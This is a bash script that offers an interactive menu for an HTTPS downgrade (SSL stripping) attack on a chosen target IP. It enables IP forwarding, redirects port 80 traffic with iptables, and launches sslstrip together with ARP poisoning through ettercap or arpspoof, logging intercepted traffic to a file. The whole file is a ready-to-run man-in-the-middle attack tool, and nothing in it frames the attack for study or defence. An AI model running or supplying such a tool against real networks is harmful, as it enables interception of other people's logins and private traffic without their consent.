#!/bin/bash
clear
echo "welcome to this simple small script to for a https downgrade attack"

echo -e "---What would you like to do--- \n
          1. MITM attack using ettercap? \n
          2. MITM attack using arpspoof?  " 

read hack


if [ $hack -eq '1' ];
then

                        echo "Enter your  interface"
                        read    networkinterface
                        echo "$networkinterface"
                        echo "enter your target ip"
                        read targetip    
                        echo "$targetip"
                        sleep 1
                        echo   
                        echo "enter your router_ip"
                        read routerip 
                        echo "$routerip"
                        echo "1" > /proc/sys/net/ipv4/ip_forward
                        echo "cntrl c every window when to exit the script"
# IP table              sleep 2
                        clear
			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
                        sleep 2
                        WID=$(xprop -root | grep "_NET_ACTIVE_WINDOW(WINDOW)"| awk '{print $5}')
                        xdotool windowfocus $WID
                        xdotool key ctrl+shift+t
                        xdotool type --delay 1 --clearmodifiers "sslstrip -k -f -l 10000 -w sslstrip.txt"
                        
                        WID=$(xprop -root | grep "_NET_ACTIVE_WINDOW(WINDOW)"| awk '{print $5}')
                        xdotool windowfocus $WID
                        xdotool key ctrl+shift+t
                        xdotool type --delay 1 --clearmodifiers "sudo ettercap -Tq -M arp:remote -i $networkinterface  -S /$targetip// /$routerip//"
                      	echo "stopping ip forwarding before exitting"
			echo 0 > /proc/sys/net/ipv4/ip_forward







else
if [ $hack -eq '2' ];
then

	echo "Enter your  interface"
        read    networkinterface
        echo "$networkinterface"
        echo "enter your target ip"
        read targetip    
        echo "$targetip"
        sleep 1
        echo   
        echo "enter your router_ip"
        read routerip 
        echo "$routerip"

	echo 1 > /proc/sys/net/ipv4/ip_forward
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
	xterm -hold -e arpspoof -i $networkinterface -t $targetip -r $routerip &
	sslstrip -l 8080
	echo "stopping ip forwarding before exitting"
	echo 0 > /proc/sys/net/ipv4/ip_forward


fi
fi

